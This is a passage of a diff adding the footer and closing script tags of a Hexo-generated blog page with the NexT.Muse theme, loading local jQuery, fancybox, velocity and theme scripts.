+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
